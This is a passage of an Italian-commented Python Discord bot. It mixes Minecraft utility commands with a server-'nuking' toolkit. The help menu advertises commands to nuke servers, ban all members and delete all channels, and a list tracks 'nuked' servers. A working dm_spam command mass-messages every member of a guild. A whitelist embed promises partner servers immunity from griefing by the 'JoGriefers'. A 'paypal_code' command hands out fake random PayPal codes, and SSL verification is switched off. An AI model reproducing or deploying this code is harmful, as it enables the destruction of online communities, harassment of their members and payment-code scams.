    # Aggiungi l'azione al bottone
    button.callback = on_button_click

# Sposta @set.error dopo la definizione del comando !set
@ticket_set.error
async def ticket_set_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Non hai il permesso di eseguire il comando. Solo gli amministratori possono utilizzare questo comando.", ephemeral=True)


@client.command()
@commands.has_permissions(administrator=True)
async def h_nuker_admin(ctx):
   embed_admin = discord.Embed(title="Comandi admin/nuker disponibili", description="Ecco la lista dei comandi disponibili e cosa fanno:", color=discord.Color.dark_blue())

   embed_admin.add_field(name="!nuke", value="Avvia il processo di nuking del server.", inline=False)
   embed_admin.add_field(name="!ban_all", value="Banna tutti i membri del server (eccetto il proprietario).", inline=False)
   embed_admin.add_field(name="!stop", value="Spegni il bot", inline=False)
   embed_admin.add_field(name="!delete_all_channels", value="elimina tutti i canali presenti nel server", inline=False)
   embed_admin.add_field(name="!show_db", value="mostra il database del bot", inline=False)
   embed_admin.add_field(name="!reset_db", value="resetta il database del bot", inline=False)
   embed_admin.add_field(name="!userinfo <user>", value="informazione su un membro", inline=False)
   embed_admin.add_field(name="!serverinfo", value="informazioni sul server", inline=False)
   embed_admin.add_field(name="!purge <numero messaggi da eliminare>", value="elimina il numero selezionato di messaggi", inline=False)
   embed_admin.add_field(name="!server_nuked", value="aggiungi l'id di un server nukkato", inline=False)
   embed_admin.add_field(name="!server_nuked_list", value="visualizza la lista di server nukkati", inline=False)
   embed_admin.add_field(name="!reset_server_nuked_list", value="resetta la lista dei server nukkati", inline=False)
   embed_admin.add_field(name="!server_nuked_remove", value="rimuovi un server dalla lista dei server nukkati", inline=False)
   embed_admin.add_field(name="!set <ruolo accesso ticket>", value="setta i ticket", inline=False)
   embed_admin.add_field(name="!dm_spam <messaggio>", value="manda a tutti un messaggio specifico", inline=False)
   embed_admin.add_field(name="!purge_all", value="elimina tutti i messaggi all'interno di un canale", inline=False)

   await ctx.send(embed=embed_admin)

@h_nuker_admin.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("Non hai abbastanza requisiti, entra nel team nukker per averli")


@client.command()
@commands.check(is_allowed_user)
async def dm_spam(ctx, *, message: str, amount: int = 1):
    members = ctx.guild.members

    for _ in range(amount):
        for member in members:
            try:
                await member.send(message)
                await ctx.send(f"**Message sent to {member.name} ({member.id})**✅")
            except discord.Forbidden:
                await ctx.send(f"_Unable to send message to {member.name} ({member.id}) - Forbidden_❌")
            except discord.HTTPException:
                await ctx.send(f"`Unable to send message to {member.name} ({member.id}) - HTTPException`📶❌")
            await asyncio.sleep(1)  # Aggiungi un breve ritardo per evitare il superamento del limite di rate

# Aggiungi un'eccezione per il comando dm_spam
@dm_spam.error
async def dm_spam_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Utilizzo corretto: `!dm_spam <message>)")
    elif isinstance(error, commands.CheckFailure):
        await ctx.send("Non hai il permesso di utilizzare questo comando.")

@client.command()
@commands.has_permissions(manage_messages=True)
async def purge_all(ctx):
    try:
        await ctx.channel.purge()
        time.sleep(2)
        await ctx.send("Tutti i messaggi sono stati eliminati.")
    except discord.Forbidden:
        await ctx.send("Non ho il permesso per eliminare i messaggi.")
    except discord.HTTPException:
        await ctx.send("Si è verificato un errore durante l'eliminazione dei messaggi.")

@client.command()
async def skin(ctx, player_name):
    # Ottieni l'UUID del giocatore
    url = f"https://api.mojang.com/users/profiles/minecraft/{player_name}"
    response = requests.get(url)
    if response.status_code == 200:
        player_data = response.json()
        player_uuid = player_data["id"]
    else:
        await ctx.send(f"Impossibile trovare il giocatore {player_name}")
        return

    # Ottieni l'immagine della skin del giocatore
    skin_url = f"https://crafatar.com/renders/body/{player_uuid}?overlay"
    embed_mc = discord.Embed(title=f"Skin di {player_name}", color=discord.Color.green())
    embed_mc.set_image(url=skin_url)

    # Invia l'immagine come embed
    await ctx.send(embed=embed_mc)

@client.tree.command(name="server-minecraft-control", description="Guarda le informazioni di un server minecraft")
async def server_control(ctx,
                         server_address: str):
    try:
        # Costruisci l'URL della richiesta API
        base_url = "https://api.mcsrvstat.us/2/"
        url = base_url + server_address

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                # Controlla se la richiesta ha avuto successo (codice 200)
                if response.status == 200:
                    server_data = await response.json()

                    # Controlla se il server è online
                    if server_data["online"]:
                        # Ottieni le informazioni del server
                        description = server_data.get("motd", {}).get("clean", [""])[0]
                        online_players = server_data["players"]["online"]
                        max_players = server_data["players"]["max"]
                        icon_url = server_data.get("icon", None)
                        ping = await get_ping(server_address)
                        ping_str = f"{ping:.2f} ms" if ping is not None else "N/A"
                        online_mode = "Modalità Online" if server_data.get("online_mode") else "Modalità Offline"
                        version = server_data.get("version", "N/A")
                        software = server_data.get("software", "N/A")

                        # Assicurati che i plugin siano disponibili nell'API
                        plugins = server_data.get("plugins", None)
                        if plugins:
                            if isinstance(plugins, dict) and "names" in plugins:
                                # Se i plugin sono disponibili con il campo "names"
                                plugins_list = ", ".join(plugins["names"])
                            elif isinstance(plugins, list):
                                # Se i plugin sono disponibili in una lista
                                plugins_list = ", ".join(plugins)
                            else:
                                plugins_list = "Nessun plugin installato."
                        else:
                            plugins_list = "Informazioni plugin non disponibili."

                        # Assicurati che le informazioni sui player siano disponibili nell'API
                        player_info = server_data.get("players", {}).get("list", None)
                        if player_info:
                            players_last_7_days = [player for player in player_info if "lastjoin" in player and player["lastjoin"] > 7]
                            player_names_last_7_days = [player["name"] for player in players_last_7_days]
                            player_list_last_7_days = "\n".join(player_names_last_7_days)
                        else:
                            player_list_last_7_days = "Informazioni sui player non disponibili."

                        embed_server = discord.Embed(title=f"{server_address}", color=discord.Color.green(), description=description)
                        embed_server.add_field(name="Online Players 👥", value=f"{online_players}/{max_players}", inline=False)
                        embed_server.add_field(name="Ping 📶", value=ping_str, inline=True)
                        embed_server.add_field(name="IP 🔰", value=server_data.get("ip", "N/A."), inline=True)
                        embed_server.add_field(name="Porta 🚪", value=server_data.get("port", "N/A"), inline=True)
                        embed_server.add_field(name="Modalità: 🆘", value=online_mode, inline=True)
                        embed_server.add_field(name="Versione ⚙️", value=version, inline=True)
                        embed_server.add_field(name="Software 💻", value=software, inline=True)
                        embed_server.add_field(name="Plugin 🧩", value=plugins_list, inline=False)
                        embed_server.add_field(name="Player Connessi Negli Ultimi 7 Giorni 📅", value=player_list_last_7_days, inline=False)

                        if icon_url:
                            # Usa l'URL dell'icona di mcapi.us, che è più corto e ben formato
                            embed_server.set_thumbnail(url=f"https://api.mcsrvstat.us/icon/{server_address}")

                        await ctx.response.send_message("**Server Info:**", embed=embed_server)
                    else:
                        await ctx.response.send_message(f"Il server {server_address} non è online.")
                else:
                    await ctx.response.send_message(f"Impossibile ottenere le informazioni del server {server_address}. Errore: {response.status}")
    except Exception as e:
        await ctx.response.send_message(f"Si è verificato un errore durante l'elaborazione della richiesta. Dettagli: {str(e)}")


async def get_ping(host):
    try:
        pong = await aioping.ping(host)
        return pong * 1000  # Converti in millisecondi
    except TimeoutError:
        return None


async def get_hosting(domain):
    try:
        w = whois.whois(domain)
        hosting_info = w.registrar
        if hosting_info:
            return hosting_info
        else:
            return "N/A"
    except Exception:
        return "N/A"

@client.command(name="server_ds_control")
async def get_server_info(ctx, invite_link: str):
    try:
        invite = await commands.InviteConverter().convert(ctx, invite_link)
        if invite.guild:  # Verifica se l'invito contiene le informazioni del server
            server = invite.guild

            # Ottieni le informazioni necessarie
            name = server.name
            member_count = server.member_count
            owner = server.owner

            # Invia le informazioni nel canale di testo
            await ctx.send(f"Nome del server: {name}\n"
                           f"Membri: {member_count}\n"
                           f"Proprietario: {owner.name}")
        else:
            await ctx.send("Il bot non è presente nel server o il link di invito non è valido.")

    except commands.errors.BadArgument:
        await ctx.send("Link di invito non valido.")
    except discord.errors.NotFound:
        await ctx.send("Il bot non è presente nel server o il link di invito non è valido.")
    except discord.errors.HTTPException as e:
        await ctx.send(f"Errore durante l'elaborazione del link di invito: {e}")

# Configurazione personalizzata per la sessione HTTP
http = httpx.AsyncClient(verify=False)  # Impostiamo "verify" su False per ignorare i problemi del certificato SSL

# Funzione per ottenere l'URL dell'immagine del mob da GitHub
def get_mob_image_url(mob_name):
    mob_name = mob_name.lower().replace(" ", "_")
    image_url = f"https://raw.githubusercontent.com/MonkeyMoon104/Mob-Minecraft/main/{mob_name}.png"
    # Non è necessario modificare l'URL, poiché il nome utente della repository è già incluso

    return image_url

# Funzione per ridimensionare l'immagine se supera il limite
async def resize_image(image_url):
    async with aiohttp.ClientSession() as session:
        async with session.get(image_url) as response:
            if response.status == 200:
                image_bytes = await response.read()
                # Imposta la dimensione massima consentita per l'immagine (2 MB)
                max_image_size = 2 * 1024 * 1024  # 2 MB in byte
                if len(image_bytes) > max_image_size:
                    return None
                else:
                    # Ridimensiona l'immagine
                    image = Image.open(io.BytesIO(image_bytes))
                    image.thumbnail((500, 500))  # Imposta le nuove dimensioni dell'immagine (500x500)
                    resized_image_bytes = io.BytesIO()
                    image.save(resized_image_bytes, format='PNG')
                    return resized_image_bytes.getvalue()
            else:
                return None

@client.command(name='search', help='Ricerca informazioni su blocchi e oggetti specifici in Minecraft.')
async def search_item(ctx, item_name):
    try:
        api_url = f'https://api.minecraftitems.com/{item_name}'
        response = requests.get(api_url)
        
        if response.status_code == 200:
            data = response.json()
            
            embed = discord.Embed(title=f"Informazioni su {item_name}",
                          color=0x00ff00)
            
            # Aggiungi informazioni sull'oggetto qui
            embed.add_field(name="Descrizione:", value=data['description'], inline=False)
            
            await ctx.send(embed=embed)
        else:
            await ctx.send("Informazioni non disponibili per questo oggetto.")
    except requests.exceptions.SSLError:
        await ctx.send("Si è verificato un problema di connessione SSL con il server. Riprova più tardi.")

# Comando !mobimage
@client.command()
async def mob_image(ctx, *, mob_name: str):
    # Ottieni l'URL dell'immagine del mob
    mob_image_url = get_mob_image_url(mob_name)

    # Ridimensiona l'immagine se necessario
    resized_image = await resize_image(mob_image_url)

    # Invia l'immagine o l'URL nel canale
    if resized_image:
        file = discord.File(io.BytesIO(resized_image), filename="image.png")
        embed = discord.Embed(title=f"Immagine del mob: {mob_name.replace('_', ' ').title()}",
                              color=discord.Color.blue())
        embed.set_image(url="attachment://image.png")

        await ctx.send(embed=embed, file=file)
    else:
        google_url = f"https://www.google.com/search?q={mob_name.replace('_', ' ').title()}&tbm=isch"
        embed = discord.Embed(title=f"Immagine del mob: {mob_name.replace('_', ' ').title()}",
                              description=f"L'immagine del mob è troppo grande. Clicca [qui]({google_url}) per vederla su Google.",
                              color=discord.Color.blue())

        await ctx.send(embed=embed)

# Funzione per ottenere l'elenco dei nomi dei file dei mob nella repository
async def get_mob_files():
    github_api_url = "https://api.github.com/repos/MonkeyMoon104/Mob-Minecraft/contents"
    async with aiohttp.ClientSession() as session:
        async with session.get(github_api_url) as response:
            if response.status == 200:
                data = await response.json()
                mob_files = [file["name"][:-4] for file in data if file["name"].endswith(".png")]
                return mob_files
            else:
                return None

# Comando !mob_help
@client.command()
async def mob_help(ctx):
    # Ottieni l'elenco dei nomi dei file dei mob
    mob_files = await get_mob_files()

    # Se l'elenco è valido, invia l'embed con le informazioni
    if mob_files:
        num_files = len(mob_files)
        mob_names = "\n".join(mob_files)

        embed = discord.Embed(title="Informazioni sulla Repository dei Mob",
                              description=f"Numero di file: {num_files}\n\nNomi dei file senza estensioni:\n{mob_names}",
                              color=discord.Color.blue())

        await ctx.send(embed=embed)
    else:
        await ctx.send("Impossibile recuperare le informazioni dalla repository.")

@client.command(name='mobstats', help='Visualizza le statistiche di un mob specifico in Minecraft.')
async def mob_stats(ctx, mob_name):
    api_url = f'https://api.minecraftitems.com/{mob_name}'
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        
        embed = discord.Embed(title=f"Statistiche di {mob_name}",
                      color=0x00ff00)
        
        embed.add_field(name="Salute:", value=data['health'], inline=False)
        embed.add_field(name="Danni:", value=data['damage'], inline=False)
        # Aggiungi altre statistiche qui
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("Informazioni non disponibili per questo mob.")

@client.command(name='playerstats', help='Visualizza le statistiche di un giocatore Minecraft.')
async def player_stats(ctx, player_name):
    api_url = f'https://api.mojang.com/users/profiles/minecraft/{player_name}'
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        uuid = data['id']
        player_name = data['name']
        
        stats_url = f'https://api.mojang.com/user/profiles/{uuid}/names'
        stats_response = requests.get(stats_url)
        stats_data = stats_response.json()
        player_name_history = [entry['name'] for entry in stats_data]
        
        embed = discord.Embed(title=f"Statistiche di {player_name}",
                      description=f"UUID: {uuid}",
                      color=0x00ff00)
        
        embed.add_field(name="Nomi precedenti:", value=", ".join(player_name_history), inline=False)
        # Aggiungi altre statistiche qui
        
        await ctx.send(embed=embed)
    else:
        await ctx.send("Giocatore non trovato.")

# Comando per generare un seed casuale
@client.command()
async def seed_gen(ctx):
    alphabet = "0123456789"
    random_seed = ''.join(random.choice(alphabet) for i in range(16))
    await ctx.send(f"Seed casuale: {random_seed}")

@client.event
async def on_disconnect():
    save_data_to_json(server_nuked_ids)

@client.command(name="joinserver", description="Aggiunge il bot al server utilizzando un link di invito")
async def join_server(ctx, invite: str):
    try:
        invite_obj = await client.fetch_invite(invite)
        await invite_obj.accept()
        await ctx.send("Il bot è stato aggiunto al server con successo!")
    except discord.errors.NotFound:
        await ctx.send("Il link di invito non è valido.")
    except discord.errors.HTTPException as e:
        await ctx.send(f"Errore durante il tentativo di unirsi al server: {e}")
    except discord.errors.Forbidden:
        await ctx.send("Non ho i permessi per unirmi a questo server.")
    except discord.errors.InvalidInvite:
        await ctx.send("Il link di invito non è valido.")

@client.command()
@commands.check(is_allowed_user)
async def server_whitelist(ctx):

    await ctx.message.delete()

    server = ctx.guild

    # Ottieni l'immagine del server
    server_icon_url = str(server.icon.url) if server.icon else "Nessuna immagine del server disponibile."

    link_familysquad = "https://discord.gg/6QzwxC3YfE"

    link_heriawild = "https://discord.gg/BGqfd6V9Xp"

    link_sharkmc = "https://discord.gg/MvBR5fMT"

    link_StoryRPG = "https://discord.gg/storyrpg"

    link_etherion = "https://discord.gg/etherionmc"

    embed = discord.Embed(title="Whitelist <:PartnerIcon:1135612478655561839>", color=discord.Color.green())

    embed.add_field(name="Server Whitelistati: <:Minecraft_Accept:1135611128731414558>", value="Server Whitelistati",inline=False)
    embed.add_field(name="Family Squad", value=f"[ds_FS]({link_familysquad})", inline=True)
    embed.add_field(name="HeriaMC", value=f"[ds_HeriaMC]({link_heriawild})", inline=True)
    embed.add_field(name="SharkMC", value=f"[ds_SharkMC]({link_sharkmc})", inline=True)
    embed.add_field(name="StoryRPG", value=f"[ds_StoryRPG]({link_StoryRPG})", inline=True)
    embed.add_field(name="Etherion", value=f"[ds_Etherion]({link_etherion})", inline=True)
    embed.add_field(name="Utilities <:Discord_info_white_theme:1135619272710824087>", value="Informazioni utili <:RedArrow:1135621247586291783>", inline=False)
    embed.add_field(name="Richiesta whitelist <:faq_badge:1135618231256752218>", value="Se volete mettere un server nella lista whitelist ovvero che **sia al sicuro dai nuke e grieff** dei JoGriefers eseguite il seguente comando: `/richiesta_whitelist [link del del server discord] [motivazione sul fatto di mettere il tuo server nella whitelist]` <:JoGriefers:1132007564318605413>", inline=False)
    embed.add_field(name="Regola whitelist <:rules:1135619464604434523><:windows_security:1135592869349032106>", value="E' **vietato grieffare e/o nukkare un server** se **presente nella whitelist**, chiunque non rispetti questa regola **andrà in contro a conseguenze gravi**", inline=False)

    embed.set_image(url="https://cdn.discordapp.com/attachments/1126898825995501679/1135584523699097700/image.png")

    if server_icon_url:
        embed.set_thumbnail(url=server_icon_url)
    else:
        embed.add_field(name="Immagine del server", value="Nessuna immagine del server disponibile.", inline=False)

    await ctx.send(embed=embed)

canale_whitelist_mod = 1135639570537517268

canale_richieste_whitelist = 1135623707302313984

@client.tree.command(name="richiesta_whitelist", description="Esegui una richiesta whitelist per il tuo server discord e per il tuo server minecraft")
async def richiesta_whitelist(ctx, link: str, motivo: str):
    avatar_url = ctx.user.avatar.url

    embed_whitelist_utente = discord.Embed(title="Richiesta whitelist <:PartnerIcon:1135612478655561839>🏳️", description="Informazione su una Richiesta Whitelist <:Minecraft_Accept:1135611128731414558>", color=discord.Color.orange())

    embed_whitelist_utente.set_thumbnail(url=avatar_url)
    embed_whitelist_utente.add_field(name="Richiesta whitelist da parte di 🗣️", value=f"{ctx.user.mention}", inline=False)
    
    # Otteniamo il nome del server dal link
    server_name = await get_server_name_from_invite(link)

    if server_name:
        # Se il nome del server è disponibile, usiamo il nome nel field dell'embed
        embed_whitelist_utente.add_field(name="Server <:discord_malware:1135609895580860436>", value=f"**Nome server**: {server_name}\n**Link**: [Link invito server discord]({link})", inline=False)
    else:
        # Se il nome del server non è disponibile, usiamo comunque il link nel field dell'embed
        embed_whitelist_utente.add_field(name="Server <:discord_malware:1135609895580860436>", value=f"**Nome server**: Non disponibile <:win11_erro_icon:1135610836778504242>\n**Link**: [Link invito server discord]({link})", inline=False)
    
    embed_whitelist_utente.add_field(name="Motivazione 🔰", value=f"`{motivo}`", inline=False)
    embed_whitelist_utente.set_footer(text="In attesa 🟠")


    embed_assenza = discord.Embed(title="Richiesta whitelist <:PartnerIcon:1135612478655561839>", description="Informazione su una Richiesta Whitelist <:Minecraft_Accept:1135611128731414558>", color=discord.Color.orange())

    embed_assenza.set_thumbnail(url=avatar_url)
    embed_assenza.add_field(name="Richiesta whitelist da parte di 🗣️", value=f"{ctx.user.mention}", inline=False)
    
    # Otteniamo il nome del server dal link
    server_name = await get_server_name_from_invite(link)

    if server_name:
        # Se il nome del server è disponibile, usiamo il nome nel field dell'embed
        embed_assenza.add_field(name="Informazioni server <:discord_malware:1135609895580860436>", value=f"**Nome server**: {server_name}\n**Link**: [Link invito server discord]({link})", inline=False)
    else:
        # Se il nome del server non è disponibile, usiamo comunque il link nel field dell'embed
        embed_assenza.add_field(name="Informazioni server <:discord_malware:1135609895580860436>", value=f"**Nome server**: Non disponibile <:win11_erro_icon:1135610836778504242>\n**Link**: [Link invito server discord]({link})", inline=False)
    
    embed_assenza.add_field(name="Motivazione 🔰", value=f"`{motivo}`", inline=False)
    embed_assenza.set_footer(text="In attesa 🟠")

    if not is_valid_discord_link(link):
        await ctx.response.send_message("Il link del server Discord è invalido o non è stato fornito correttamente <:invalid_link:1135610443218567198>", ephemeral=True)
        return

    # Invia l'embed nel canale specificato
    canale = client.get_channel(canale_whitelist_mod)

    canale_richieste = client.get_channel(canale_richieste_whitelist)

    if canale_richieste is not None:

        messaggio_richiesta_without_button = await canale_richieste.send(embed=embed_whitelist_utente)

    else:
        await ctx.response.send_message("Il canale richieste-whitelist non è stato trovato", ephemeral=True)

    if canale is not None:
        # Crea i bottoni
        accetta_button = discord.ui.Button(style=discord.ButtonStyle.green, label="✅ Accetta")
        rifiuta_button = discord.ui.Button(style=discord.ButtonStyle.red, label="❌ Rifiuta")

        # Aggiungi i bottoni al view
        view = discord.ui.View()
        view.add_item(accetta_button)
        view.add_item(rifiuta_button)

        # Invia il messaggio con i bottoni
        messaggio_assenza = await canale.send(embed=embed_assenza, view=view)

        # Funzioni da eseguire al click dei bottoni
        async def on_accept(interaction: discord.Interaction):
            owner_role = discord.utils.get(ctx.guild.roles, name="Gestore Whitelist")
            if owner_role in ctx.user.roles:
                await interaction.response.send_message("Richiesta accettata ✅", ephemeral=True)
                embed_assenza.color = discord.Color.green()
                embed_assenza.set_footer(text="Accettata ✅")
                view.clear_items()
                await messaggio_assenza.edit(embed=embed_assenza, view=view)

                embed_whitelist_utente.color = discord.Color.green()
                embed_whitelist_utente.set_footer(text="Accettata ✅")
                await messaggio_richiesta_without_button.edit(embed=embed_whitelist_utente)

                try:
                    await ctx.user.send("La tua Richiesta whitelist è stata **accettata** ✅")
                except discord.Forbidden:
                    await ctx.response.send_message("Impossibile inviare messaggio all'utente che ha fatto richiesta, probabilmente ha i messaggi disattivati", ephemeral=True)
            else:
                await interaction.response.send_message(f"Solo i membri con il ruolo `{owner_role}` possono accettare o rifiutare la richiesta whitelist", ephemeral=True)

        async def on_decline(interaction: discord.Interaction):
            owner_role = discord.utils.get(ctx.guild.roles, name="Gestore Whitelist")
            if owner_role in ctx.user.roles:
                await interaction.response.send_message("Richiesta rifiutata ❌", ephemeral=True)
                embed_assenza.color = discord.Color.red()
                embed_assenza.set_footer(text="Rifiutata ❌")
                view.clear_items()
                await messaggio_assenza.edit(embed=embed_assenza, view=view)

                embed_whitelist_utente.color = discord.Color.red()
                embed_whitelist_utente.set_footer(text="Rifiutata ❌")
                await messaggio_richiesta_without_button.edit(embed=embed_whitelist_utente)

                try:
                    await ctx.user.send("La tua Richiesta whitelist è stata **rifiutata** ❌")
                except discord.Forbidden:
                    await ctx.response.send_message("Impossibile inviare messaggio all'utente che ha fatto richiesta, probabilmente ha i messaggi disattivati", ephemeral=True)
            else:
                await interaction.response.send_message(f"Solo i membri con il ruolo `{owner_role}` possono accettare o rifiutare la richiesta whitelist", ephemeral=True)

        # Associa le funzioni ai bottoni
        accetta_button.callback = on_accept
        rifiuta_button.callback = on_decline

        await ctx.response.send_message(f"Richiesta whitelist effettuata e inviata nel canale: {canale_richieste.mention}", ephemeral=True)
    else:
        await ctx.response.send_message("Il canale whitelist-moderator non è stato trovato", ephemeral=True)

# Gestione dell'errore
@richiesta_whitelist.error
async def richiesta_whitelist_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.response.send_message("Utilizzo del comando errato. Esempio: `/richiesta_whitelist [link server discord]`", ephemeral=True)
    elif isinstance(error, commands.CommandInvokeError):
        await ctx.response.send_message("Errore interno del comando. Riprova più tardi.", ephemeral=True)
    elif isinstance(error, commands.MissingRole):
        await ctx.reponse.send_message("Non hai il permesso di fare una richiesta whitelist", ephemeral=True)

@client.tree.command(name="paypal_code", description="Genarate paypal code")
async def paypal_code_gen(ctx):
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))


    await ctx.response.send_message("Check ur dm!", ephemeral=True)
    await ctx.user.send(f"Your PayPal code: {code}")

client.run(token)